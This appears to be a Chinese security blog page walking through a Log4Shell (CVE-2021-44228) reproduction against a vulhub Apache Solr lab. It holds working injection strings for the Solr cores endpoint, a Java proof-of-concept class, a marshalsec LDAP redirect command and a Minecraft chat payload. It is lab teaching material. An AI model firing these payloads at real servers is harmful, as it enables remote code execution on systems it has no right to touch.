@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>log4shell - 安全员小周 | ROOT</title>
+    <!-- Prism CSS for Synthax Highlighting (White Theme) -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body class="article-mode">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="brand">
+            <span>#_</span> 安全员小周
+        </div>
+
+        <div class="nav-group">
+        <div class="nav-header">知识库</div>
+            <details class="folder-group">
+                <summary>鹏城杯2024</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-19-鹏城杯2024-训练.html" class="nav-item">鹏城杯2024-训练</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>计算机网络</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-06-21-计算机网络-OSPF.html" class="nav-item">计算机网络-OSPF</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>综合归档</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-01-30-CISCN-2018Picture-misc-wp.html" class="nav-item">CISCN_2018Picture_misc_wp</a>
+            
+                <a href="/posts/2024-03-13-Rick-pickle.html" class="nav-item">Rick_pickle</a>
+            
+                <a href="/posts/2024-03-19-Blue靶场实践.html" class="nav-item">Blue靶场实践</a>
+            
+                <a href="/posts/2024-04-26-github-PicGo-obsidian.html" class="nav-item">github+PicGo+obsidian</a>
+            
+                <a href="/posts/2024-05-25-刷题记录.html" class="nav-item">刷题记录</a>
+            
+                <a href="/posts/2024-06-07-计算机组成原理-运算器.html" class="nav-item">计算机组成原理_运算器</a>
+            
+                <a href="/posts/2024-06-21-计算机组成原理-存储器.html" class="nav-item">计算机组成原理_存储器</a>
+            
+                <a href="/posts/2024-07-21-redis-利用方式大全.html" class="nav-item">redis_利用方式大全</a>
+            
+                <a href="/posts/2024-07-27-hackmyvm-coffeeshop.html" class="nav-item">hackmyvm_coffeeshop</a>
+            
+                <a href="/posts/2024-08-17-log4shell.html" class="nav-item">log4shell</a>
+            
+                <a href="/posts/2024-09-09-浏览器解码顺序和解析顺序for-xss.html" class="nav-item">浏览器解码顺序和解析顺序for-xss</a>
+            
+                <a href="/posts/2024-09-16-CORS-跨域资源共享.html" class="nav-item">CORS_跨域资源共享</a>
+            
+                <a href="/posts/2024-09-17-ip2domain.html" class="nav-item">ip2domain</a>
+            
+                <a href="/posts/2024-09-17-Oneforall.html" class="nav-item">Oneforall</a>
+            
+                <a href="/posts/2024-09-17-类.html" class="nav-item">类</a>
+            
+                <a href="/posts/2024-10-20-activity.html" class="nav-item">activity</a>
+            
+                <a href="/posts/2024-10-20-manifest.html" class="nav-item">manifest</a>
+            
+                <a href="/posts/2024-10-20-service.html" class="nav-item">service</a>
+            
+                <a href="/posts/2024-10-30-2024网鼎杯青龙组.html" class="nav-item">2024网鼎杯青龙组</a>
+            
+                <a href="/posts/2024-10-30-网鼎杯模拟赛.html" class="nav-item">网鼎杯模拟赛</a>
+            
+                <a href="/posts/2024-11-04-子域名泛解析解析.html" class="nav-item">子域名泛解析解析</a>
+            
+                <a href="/posts/2024-11-05-dns欺骗.html" class="nav-item">dns欺骗</a>
+            
+                <a href="/posts/2024-11-05-mac-泛洪.html" class="nav-item">mac_泛洪</a>
+            
+                <a href="/posts/2024-11-15-服务.html" class="nav-item">服务</a>
+            
+                <a href="/posts/2024-11-17-app大致框架.html" class="nav-item">app大致框架</a>
+            
+                <a href="/posts/2024-11-25-安全狗.html" class="nav-item">安全狗</a>
+            
+                <a href="/posts/2024-11-30-hash扩展攻击.html" class="nav-item">hash扩展攻击</a>
+            
+                <a href="/posts/2024-11-30-RCE绕过.html" class="nav-item">RCE绕过</a>
+            
+                <a href="/posts/2024-11-30-tcp握手.html" class="nav-item">tcp握手</a>
+            
+                <a href="/posts/2024-11-30-WEBDAv.html" class="nav-item">WEBDAv</a>
+            
+                <a href="/posts/2024-11-30-短文件名枚举.html" class="nav-item">短文件名枚举</a>
+            
+                <a href="/posts/2024-12-19-ciscn训练.html" class="nav-item">ciscn训练</a>
+            
+                <a href="/posts/2024-12-25-新星赛.html" class="nav-item">新星赛</a>
+            
+                <a href="/posts/2025-01-07-软件安全赛.html" class="nav-item">软件安全赛</a>
+            
+                <a href="/posts/2025-01-15-jsonp.html" class="nav-item">jsonp</a>
+            
+                <a href="/posts/2025-01-15-同源策略.html" class="nav-item">同源策略</a>
+            
+                <a href="/posts/2025-01-19-一次混淆webshell分析.html" class="nav-item">一次混淆webshell分析</a>
+            
+                <a href="/posts/2025-01-23-hexo博客搭建.html" class="nav-item">hexo博客搭建</a>
+            
+                <a href="/posts/2025-01-29-SMB445端口利用.html" class="nav-item">SMB445端口利用</a>
+            
+                <a href="/posts/2025-01-30-域常见信息枚举.html" class="nav-item">域常见信息枚举</a>
+            
+                <a href="/posts/2025-02-03-红日1.html" class="nav-item">红日1</a>
+            
+                <a href="/posts/2025-02-05-URLDNS链.html" class="nav-item">URLDNS链</a>
+            
+                <a href="/posts/2025-02-14-安全服务实习面经.html" class="nav-item">安全服务实习面经</a>
+            
+                <a href="/posts/2025-02-21-实习该反问什么-.html" class="nav-item">实习该反问什么?</a>
+            
+                <a href="/posts/2025-04-05-c--内存机制和安全.html" class="nav-item">c++内存机制和安全</a>
+            
+                <a href="/posts/2025-06-01-pickle.html" class="nav-item">pickle</a>
+            
+                <a href="/posts/2025-06-02-vllm大模型推理引擎.html" class="nav-item">vllm大模型推理引擎</a>
+            
+                <a href="/posts/hello-world.html" class="nav-item">我的第一篇安全文章</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>算法</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-20-算法-Init.html" class="nav-item">算法-Init</a>
+            
+                <a href="/posts/2024-09-20-算法-分治和逆序.html" class="nav-item">算法-分治和逆序</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>漏洞复现</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-11-30-常见服务器解析漏洞.html" class="nav-item">常见服务器解析漏洞</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>湖北大学</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-05-14-湖北大学-奇安信杯完整版wp.html" class="nav-item">湖北大学-奇安信杯完整版wp</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>横向移动</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-08-横向移动-远程创建进程.html" class="nav-item">横向移动-远程创建进程</a>
+            
+                <a href="/posts/2024-09-10-横向移动-WMI.html" class="nav-item">横向移动-WMI</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>权限提升</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-04-权限提升-Linux-passwd提权.html" class="nav-item">权限提升-Linux passwd提权</a>
+            
+                <a href="/posts/2024-03-09-权限提升-windows计划任务提权.html" class="nav-item">权限提升-windows计划任务提权</a>
+            
+                <a href="/posts/2024-03-19-权限提升-windows服务提权.html" class="nav-item">权限提升-windows服务提权</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>文件上传</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-18-文件上传-php.html" class="nav-item">文件上传-php</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>数学基础信安总结</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-25-数学基础信安总结-一次遗忘的作业.html" class="nav-item">数学基础信安总结-一次遗忘的作业</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>操作系统</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-11-操作系统-api接口.html" class="nav-item">操作系统-api接口</a>
+            
+                <a href="/posts/2024-09-11-操作系统-启动.html" class="nav-item">操作系统-启动</a>
+            
+                <a href="/posts/2024-09-11-操作系统-基础认识.html" class="nav-item">操作系统-基础认识</a>
+            
+                <a href="/posts/2024-10-20-操作系统-内核.html" class="nav-item">操作系统-内核</a>
+            
+                <a href="/posts/2024-10-20-操作系统-进程.html" class="nav-item">操作系统-进程</a>
+            
+                <a href="/posts/2024-11-12-操作系统启动实验.html" class="nav-item">操作系统启动实验</a>
+            
+                <a href="/posts/2024-11-12-操作系统进程管理实验.html" class="nav-item">操作系统进程管理实验</a>
+            
+                <a href="/posts/2024-12-25-操作系统概念集合.html" class="nav-item">操作系统概念集合</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>外联木马分析</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-26-外联木马分析-ciscn.html" class="nav-item">外联木马分析-ciscn</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>域整理</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-27-域整理-基础.html" class="nav-item">域整理-基础</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>内网穿透</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-14-内网穿透-ligolo使用.html" class="nav-item">内网穿透-ligolo使用</a>
+            
+                <a href="/posts/2025-01-14-内网穿透-ssh搭建.html" class="nav-item">内网穿透-ssh搭建</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>内网安全</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-29-内网横向的一些方式.html" class="nav-item">内网横向的一些方式</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>VULNHUB</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-01-vulnhub-vegeta.html" class="nav-item">vulnhub-vegeta</a>
+            
+                <a href="/posts/2024-07-13-Vulnhub-Aiweb1.html" class="nav-item">Vulnhub-Aiweb1</a>
+            
+                <a href="/posts/2024-07-14-Vulnhub-Breakout.html" class="nav-item">Vulnhub-Breakout</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>TRYHACKME</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-01-Tryhackme-Overpass.html" class="nav-item">Tryhackme-Overpass</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>THM</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-05-14-Thm-alfred.html" class="nav-item">Thm-alfred</a>
+            
+                <a href="/posts/2024-05-14-Thm-Steel-Mountain.html" class="nav-item">Thm-Steel-Mountain</a>
+            
+                <a href="/posts/2024-08-17-Thm-Gane-zone.html" class="nav-item">Thm-Gane_zone</a>
+            
+                <a href="/posts/2024-08-17-Thm-Hackpark.html" class="nav-item">Thm-Hackpark</a>
+            
+                <a href="/posts/2024-08-17-Thm-Skynet.html" class="nav-item">Thm-Skynet</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SQLI</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-19-sqli-labs靶场-二次注入.html" class="nav-item">sqli-labs靶场-二次注入</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SQL</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-30-sql-学习-day1.html" class="nav-item">sql_学习_day1</a>
+            
+                <a href="/posts/2024-05-03-sql-索引.html" class="nav-item">sql-索引</a>
+            
+                <a href="/posts/2024-05-03-sql-表修改和创建.html" class="nav-item">sql-表修改和创建</a>
+            
+                <a href="/posts/2024-05-03-sql-表增删查改.html" class="nav-item">sql-表增删查改</a>
+            
+                <a href="/posts/2024-05-03-sql-视图创建.html" class="nav-item">sql-视图创建</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>SNORT</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-12-09-snort-ips.html" class="nav-item">snort-ips</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>PHPMYADMIN</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-14-phpmyadmin-getshell姿势.html" class="nav-item">phpmyadmin-getshell姿势</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>NSSCTF</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-01-26-nssctf-round-16web部分wp.html" class="nav-item">nssctf-round#16web部分wp</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>JAVA</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-11-java-包和输入输出.html" class="nav-item">java-包和输入输出</a>
+            
+                <a href="/posts/2024-09-11-java-数据结构.html" class="nav-item">java-数据结构</a>
+            
+                <a href="/posts/2024-09-11-java-逻辑结构.html" class="nav-item">java-逻辑结构</a>
+            
+                <a href="/posts/2025-02-05-java动态代理.html" class="nav-item">java动态代理</a>
+            
+                <a href="/posts/2025-02-05-java反射.html" class="nav-item">java反射</a>
+            
+                <a href="/posts/2025-02-05-java反序列化.html" class="nav-item">java反序列化</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>HTB</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-25-HTB-LAME.html" class="nav-item">HTB-LAME</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>HACKMYVM</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-15-Hackmyvm-leet.html" class="nav-item">Hackmyvm-leet</a>
+            
+                <a href="/posts/2024-10-10-Hackmyvm-Lookup.html" class="nav-item">Hackmyvm-Lookup</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>EW</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-01-17-ew-内网.html" class="nav-item">ew-内网</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>DOCKER</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2025-02-01-docker.html" class="nav-item">docker</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>CTF</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-03-03-sictf-web.html" class="nav-item">sictf_web</a>
+            
+                <a href="/posts/2024-03-19-CTF长城杯.html" class="nav-item">CTF长城杯</a>
+            
+                <a href="/posts/2024-03-30-ctf-misc-掌控腾龙杯.html" class="nav-item">ctf-misc-掌控腾龙杯</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录1.html" class="nav-item">ctf刷题记录1</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录2.html" class="nav-item">ctf刷题记录2</a>
+            
+                <a href="/posts/2024-05-14-ctf刷题记录3.html" class="nav-item">ctf刷题记录3</a>
+            
+                <a href="/posts/2024-07-21-ctfhub-ssrf基础认证.html" class="nav-item">ctfhub_ssrf基础认证</a>
+            
+                <a href="/posts/2024-07-28-ctf刷题记录4.html" class="nav-item">ctf刷题记录4</a>
+            
+                <a href="/posts/2024-09-11-2024-9-11-CTF.html" class="nav-item">2024-9-11-CTF</a>
+            
+                <a href="/posts/2024-09-12-CTF-Ciscn-cyberpunk.html" class="nav-item">CTF-Ciscn-cyberpunk</a>
+            
+                <a href="/posts/2024-10-02-CTF刷题buuctf.html" class="nav-item">CTF刷题buuctf</a>
+            
+                <a href="/posts/2025-01-19-suctf.html" class="nav-item">suctf</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>BEGIN</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-02-11-begin-ctf.html" class="nav-item">begin-ctf</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>ANDROID</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-16-2024-1-2-12-Android-Studio配置.html" class="nav-item">2024-1.2.12-Android-Studio配置</a>
+            
+                <a href="/posts/2024-09-19-Android-UI设计.html" class="nav-item">Android_UI设计</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>AD域枚举信息</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-09-08-AD域枚举信息-BloodHound.html" class="nav-item">AD域枚举信息-BloodHound</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-Microsoft控制台MMC.html" class="nav-item">AD域枚举信息-Microsoft控制台MMC</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-powershell-cmdlet.html" class="nav-item">AD域枚举信息-powershell-cmdlet</a>
+            
+                <a href="/posts/2024-09-08-AD域枚举信息-命令枚举.html" class="nav-item">AD域枚举信息-命令枚举</a>
+            </div></details>
+            <details class="folder-group">
+                <summary>4</summary>
+                <div class="folder-content">
+        
+                <a href="/posts/2024-04-28-4-28ctf急切刷题.html" class="nav-item">4-28ctf急切刷题</a>
+            </div></details></div>
+
+        <div class="user-profile">
+            <div class="avatar" style="background:#333; border:1px solid #00ff41; color:#00ff41;">K</div>
+            <div style="font-size: 0.9rem; font-weight: 500; color: #00ff41;">安全员小周</div>
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-wrapper">
+        <header class="top-header">
+            <div class="breadcrumb">
+                ~/home/综合归档/log4shell ...
+            </div>
+
+            <div class="search-container">
+                <input type="text" class="search-input" placeholder="grep -r 'keyword' ." id="searchInput">
+                <div class="search-results" id="searchResults"></div>
+            </div>
+        </header>
+
+        <main class="content-area">
+            <h1 class="article-title">log4shell</h1>
+            <div class="markdown-body">
+                <h3><strong>Log4j 2.x</strong>:</h3>
+<ul>
+<li>Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-2021-44228），也称为 Log4Shell 漏洞。该漏洞允许攻击者通过 JNDI 查找恶意代码来远程执行代码，影响范围广泛。这个漏洞在 Log4j 2.0 到 2.14.1 版本中存在，并已在 2.15.0 及后续版本中得到修复</li>
+</ul>
+<p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。log4j2中存在<strong>JNDI注入漏洞</strong>，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码</p>
+<h3>JNDI简单介绍</h3>
+<p>JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。<br>JNDI注入主要是用过下载远程class，来运行恶意代码。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务。</p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240806105256.png" alt="image.png"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/8a6d0c48141bbdaaceb44fe403ddb125.png" alt=""></p>
+<h4>漏洞验证:</h4>
+<p>一般来讲log4j的漏洞，是一种严重的漏洞，因为他覆盖面广，使用广泛，因此可以看到我们对于log4<br>j，一般都是在一些大型的服务器上的安装的组件的上面去验证。</p>
+<h4>漏洞分析:</h4>
+<p>最主要还是 log4j 可以通过特定的形式例如:${}来进行一个查询替换的功能，例如我们的环境变量。因此还可以暴露敏感信息。但是他不仅可以查找变量进行替换还可以使用 ，jndi的查询服务可以查询目录和命名服务。之后就可以利用rmi或者ldap去访问我们的web服务器上的相关class文件，下载之后执行再反弹shell回到我们的攻击机器。</p>
+<h5>以minecraft为例</h5>
+<p>Minecraft服务器是专门为Minecraft游戏设计的，它们允许玩家在Minecraft游戏中进行多人游戏和互动。这些服务器使用特定的Minecraft服务器软件来运行，这些软件是为支持Minecraft游戏而开发的。具体来说，Minecraft Java Edition使用的服务器软件称为Minecraft: Java Edition Server，而Minecraft Bedrock Edition（如手机版、Windows 10版等）使用的服务器软件称为Minecraft Bedrock Edition Server。</p>
+<p>因此，Minecraft服务器不是通用的服务器，不能像一般的Web服务器或游戏服务器那样用于其他用途。它们专门设计用于运行Minecraft游戏，管理游戏世界、玩家互动和游戏规则。</p>
+<p>因此我们需要一个相应版本的启动器。然后连接服务器在游戏中输入我们的payload。${jndi:ldap:ip/a} 下载对应的web服务器上的payload从而getshell</p>
+<h4>不同服务器</h4>
+<p>不同环境依赖，不同服务器对于log4j 记录接口是不一样的。因此可能触发点虽然都是${}但是我们输入的位置和接口不一样，要随机而变。</p>
+<h3>漏洞复现</h3>
+<p>根据vulhub 官方给出的漏洞环境进行复现。<br>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p>
+<p>执行如下命令启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1：</p>
+<pre><code class="language-shell">docker compose up -d
+</code></pre>
+<p>服务启动后，访问<code>http://your-ip:8983</code>即可查看到Apache Solr的后台页面。可以看到这就是<br>Apache Solr 是一个可以作为服务运行的应用程序。它通常以服务器模式运行，接受来自客户端的搜索请求，并返回搜索结果。Solr 提供了一个 HTTP 接口，可以通过 RESTful API 进行操作。这使得 Solr 可以方便地与其他应用程序集成，通过 Web 请求进行数据索引和搜索查询。</p>
+<p>Solr 还支持配置为集群模式，以处理大规模的数据和高负载的搜索请求。它具有许多功能，如分布式搜索、实时索引、负载均衡和自动故障转移，适用于大规模和高性能的搜索需求</p>
+<h5>验证</h5>
+<p>一般验证都是用dnslog</p>
+<pre><code class="language-shell">${jndi:dns://${sys:java.version}.example.com}
+</code></pre>
+<p>在 Log4j 中，<code>${sys:java.version}</code> 是一种使用变量替换的语法，用于在日志配置文件中插入动态值。</p>
+<ul>
+<li><code>${sys:java.version}</code> 是一个占位符，表示 Log4j 会用实际的系统属性值来替换它。</li>
+<li><code>sys</code> 表示这是一个系统属性的占位符。</li>
+<li><code>java.version</code> 是要替换的具体系统属性的名称。</li>
+</ul>
+<p>在这个例子中，<code>java.version</code> 是一个 Java 系统属性，它包含了当前运行的 Java 版本信息。Log4j 会在解析配置文件时用这个系统属性的实际值替换 <code>${sys:java.version}</code>。</p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811221326.png" alt="image.png"><br>此时我们的环境已经起来了，可以看到这个就是solar admin系统。我们需要找到log4j记录的地方，</p>
+<h4>核心</h4>
+<p>在 Apache Solr 中，<code>/solr/admin/cores</code> 是 Solr 的一个管理路径，用于操作和管理 Solr 的“cores”（核心）。以下是这个路径的主要用途：</p>
+<h3><strong>主要功能</strong></h3>
+<ol>
+<li><p><strong>列出核心</strong>:</p>
+<ul>
+<li>访问 <code>http://&lt;host&gt;:&lt;port&gt;/solr/admin/cores?action=STATUS</code> 可以查看当前 Solr 实例中的所有核心及其状态。</li>
+</ul>
+</li>
+<li><p><strong>查看核心状态</strong>:</p>
+<ul>
+<li>提供核心的运行状态、配置信息和统计数据，帮助监控和管理 Solr 的各个核心。</li>
+</ul>
+</li>
+<li><p><strong>管理核心</strong>:</p>
+<ul>
+<li>通过这个路径，你可以执行各种管理操作，比如重新加载、卸载、创建新核心等。例如：<ul>
+<li><code>http://&lt;host&gt;:&lt;port&gt;/solr/admin/cores?action=RELOAD&amp;core=&lt;core_name&gt;</code> 用于重新加载指定核心。</li>
+<li><code>http://&lt;host&gt;:&lt;port&gt;/solr/admin/cores?action=UNLOAD&amp;core=&lt;core_name&gt;</code> 用于卸载指定核心。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3><strong>示例使用</strong></h3>
+<ul>
+<li><p><strong>列出所有核心</strong>:</p>
+<p>Copy Code</p>
+<p><code>http://&lt;host&gt;:&lt;port&gt;/solr/admin/cores?action=STATUS</code></p>
+<p>这将返回一个 JSON 格式的响应，包含所有核心的详细状态信息。</p>
+</li>
+<li><p><strong>重新加载核心</strong>:</p>
+<p>Copy Code</p>
+<p><code>http://&lt;host&gt;:&lt;port&gt;/solr/admin/cores?action=RELOAD&amp;core=my_core</code></p>
+<p>这将重新加载名为 <code>my_core</code> 的核心，适用于配置变更后需要重新加载核心的情况。</p>
+</li>
+</ul>
+<h3><strong>如何访问</strong></h3>
+<p>确保 Solr 实例正在运行，并且你能够通过指定的主机和端口访问 Solr。访问 <code>/solr/admin/cores</code> 可以帮助你进行核心的监控和管理工作，是 Solr 系统管理中的重要一环。</p>
+<p>Solr 的查询记录和其他重要事件通常会被记录在 log4j 日志中。Solr 使用 log4j 进行日志记录，具体的日志记录位置和详细程度可以通过 log4j 配置文件进行设置。查询记录、错误信息、系统状态等会被写入到指定的日志文件中，帮助你监控和调试 Solr 实例。通过这一点，我们可以触发${}进行替换触发。</p>
+<h4>利用链</h4>
+<h5>dnslog验证</h5>
+<pre><code class="language-shell">/solr/admin/cores?action=${jndi:dns://${sys:java.version}.45046de8.log.dnslog.biz.}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811230754.png" alt="image.png"><br>很明显利用成功。<br>既然证明存在现在我们的想法肯定是想利用ldap服务器进行一个rce，因为jndi查询服务不仅可以查询dns服务还可以查询ldap服务。ldap又可以访问我们的web服务。从而让服务器下载对应的恶意web<br>java class文件从而执行</p>
+<h5>rce</h5>
+<h6>准备恶意文件</h6>
+<pre><code class="language-java">package org.com.test;
+
+import java.io.IOException;
+
+public class log4j {
+
+    public static void main(String[] args) {
+        log4j exploit = new log4j();
+    }
+
+    public log4j() {
+        try {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<ol>
+<li><p><strong><code>Runtime.getRuntime().exec(&quot;calc&quot;);</code></strong>:</p>
+<ul>
+<li><code>Runtime.getRuntime()</code> 返回当前应用程序的运行时对象，该对象允许应用程序与运行环境进行交互。</li>
+<li><code>exec(&quot;calc&quot;)</code> 方法用于执行指定的系统命令。在 Windows 操作系统上，<code>&quot;calc&quot;</code> 是启动计算器的命令。因此，这行代码试图启动计算器应用程序。</li>
+<li>如果你在其他操作系统上运行这个代码（比如 macOS 或 Linux），<code>&quot;calc&quot;</code> 可能不会有任何效果，因为计算器的命令在不同操作系统上是不同的。</li>
+</ul>
+</li>
+<li><p><strong><code>catch (IOException e)</code></strong>:</p>
+<ul>
+<li><code>IOException</code> 是一个异常，表示在输入或输出操作中发生了问题。在这里，它用于捕获 <code>exec</code> 方法可能抛出的异常（例如命令无法执行或文件无法找到）。</li>
+<li><code>e.printStackTrace();</code> 用于打印异常的堆栈跟踪，以帮助调试和找出错误的具体</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811232320.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240814224511.png" alt="image.png"><br>先开启一个web服务 ，之后利用工具创建ldap服务器之后开始攻击。</p>
+<h5>准备ldap</h5>
+<p>我们需要使用jndi找到ldap服务，之后使用ldap的功能去访问我们的web服务器。</p>
+<p>完事具备就差ldap服务器</p>
+<p><a href="marshalsec.md#**%E5%BC%80%E5%90%AFLDAP%E6%9C%8D%E5%8A%A1">**开启LDAP服务</a></p>
+<pre><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:1234/#log4j 1389
+</code></pre>
+<p>这个可以直接确定ldap端口和ldap响应的url<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240814225636.png" alt="image.png"><br>我们必须在class文件中省略 class后缀只能用#名字<br>Listening on 0.0.0.0:1389<br>已经启动此时我们需要直接触发链条</p>
+<h4>***payload</h4>
+<pre><code class="language-shell">/solr/admin/cores?action=${jndi:ldap://127.0.0.1:1389}
+</code></pre>
+
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // Search Logic
+        const searchInput = document.getElementById('searchInput');
+        const searchResults = document.getElementById('searchResults');
+        
+        // Focus shortcut
+        document.addEventListener('keydown', (e) => {
+            if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+                e.preventDefault();
+                searchInput.focus();
+            }
+        });
+
+        let searchIndex = [];
+
+        // Load Index
+        fetch('/search.json')
+            .then(res => res.json())
+            .then(data => {
+                searchIndex = data;
+            });
+
+        searchInput.addEventListener('input', (e) => {
+            const query = e.target.value.toLowerCase();
+            if (query.length < 2) {
+                searchResults.style.display = 'none';
+                return;
+            }
+
+            const results = searchIndex.filter(item => 
+                item.title.toLowerCase().includes(query) || 
+                (item.content && item.content.toLowerCase().includes(query))
+            ).slice(0, 8); // Limit to 8
+
+            if (results.length > 0) {
+                searchResults.innerHTML = results.map(item => `
+                    <a href="${item.link}" class="search-result-item">
+                        <div class="search-result-title">📄 ${item.title}</div>
+                        <div class="search-result-meta">${item.date} · ${item.category}</div>
+                    </a>
+                `).join('');
+                searchResults.style.display = 'block';
+            } else {
+                searchResults.innerHTML = '<div style="padding:1rem;color:#9ca3af;text-align:center;">无搜索结果</div>';
+                searchResults.style.display = 'block';
+            }
+        });
+
+        // Close search on outside click
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.search-container')) {
+                searchResults.style.display = 'none';
+            }
+        });
+
+        // Sidebar Logic Enhanced
+        document.addEventListener('DOMContentLoaded', function() {
+            const currentPath = window.location.pathname;
+            
+            // 1. Highlight Active Link & Open Parent
+            const navLinks = document.querySelectorAll('.nav-item');
+            navLinks.forEach(link => {
+                let href = link.getAttribute('href');
+                // Normalize paths for comparison (remove trailing slashes, ignoring domain)
+                if (href && currentPath.indexOf(href) !== -1 && href !== '/') {
+                    link.classList.add('active');
+                    
+                    // Open all parents
+                    let parent = link.closest('details');
+                    while (parent) {
+                        parent.open = true;
+                        parent = parent.parentElement.closest('details');
+                    }
+                }
+            });
+
+            // 2. Preserve Sidebar Scroll Position
+            const sidebar = document.querySelector('.nav-group');
+            if (sidebar) {
+                const storedScroll = localStorage.getItem('sidebarScroll');
+                if (storedScroll) {
+                    sidebar.scrollTop = storedScroll;
+                }
+                
+                // Save scroll on click or before unload
+                window.addEventListener('beforeunload', () => {
+                    localStorage.setItem('sidebarScroll', sidebar.scrollTop);
+                });
+            }
+
